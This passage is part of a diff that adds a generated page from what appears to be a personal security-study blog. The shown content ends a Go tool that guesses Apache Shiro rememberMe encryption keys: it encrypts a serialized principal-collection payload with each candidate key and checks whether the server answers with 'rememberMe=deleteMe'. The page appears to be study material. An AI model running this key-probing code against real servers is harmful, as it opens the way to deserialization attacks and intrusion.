+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">setCookies</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">resp</span><span class="p">.</span><span class="nf">Cookies</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">cookie</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">setCookies</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">cookie</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">if</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">cookie</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;rememberMe=deleteMe&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">generateRememberMe</span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">bIV</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;1234567890123456&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">bKey</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">base64</span><span class="p">.</span><span class="nx">StdEncoding</span><span class="p">.</span><span class="nf">DecodeString</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="k">return</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">payload</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="s">&#34;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">bPayload</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">base64</span><span class="p">.</span><span class="nx">StdEncoding</span><span class="p">.</span><span class="nf">DecodeString</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">bPayload</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nf">PKCS5Padding</span><span class="p">(</span><span class="nx">bPayload</span><span class="p">,</span><span class="w"> </span><span class="nx">aes</span><span class="p">.</span><span class="nx">BlockSize</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">block</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">aes</span><span class="p">.</span><span class="nf">NewCipher</span><span class="p">(</span><span class="nx">bKey</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Panicln</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">ciphertext</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">aes</span><span class="p">.</span><span class="nx">BlockSize</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">bPayload</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">mode</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cipher</span><span class="p">.</span><span class="nf">NewCBCEncrypter</span><span class="p">(</span><span class="nx">block</span><span class="p">,</span><span class="w"> </span><span class="nx">bIV</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">mode</span><span class="p">.</span><span class="nf">CryptBlocks</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">[</span><span class="nx">aes</span><span class="p">.</span><span class="nx">BlockSize</span><span class="p">:],</span><span class="w"> </span><span class="nx">bPayload</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nb">copy</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">[:</span><span class="nx">aes</span><span class="p">.</span><span class="nx">BlockSize</span><span class="p">],</span><span class="w"> </span><span class="nx">bIV</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nx">base64</span><span class="p">.</span><span class="nx">StdEncoding</span><span class="p">.</span><span class="nf">EncodeToString</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">PKCS5Padding</span><span class="p">(</span><span class="nx">ciphertext</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">blockSize</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">padding</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">(</span><span class="nx">blockSize</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">)</span><span class="o">%</span><span class="nx">blockSize</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">padtext</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nf">Repeat</span><span class="p">([]</span><span class="kt">byte</span><span class="p">{</span><span class="nb">byte</span><span class="p">(</span><span class="nx">padding</span><span class="p">)},</span><span class="w"> </span><span class="nx">padding</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="nx">padtext</span><span class="o">...</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/posts/sec-pwnable/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>pwnable尝试</span>
+  </a>
+  <a class="next" href="http://localhost:1313/posts/sec-phpggc-thinkphp/">
+    <span class="title">Next »</span>
+    <br>
+    <span>thinkphp5漏洞学习</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
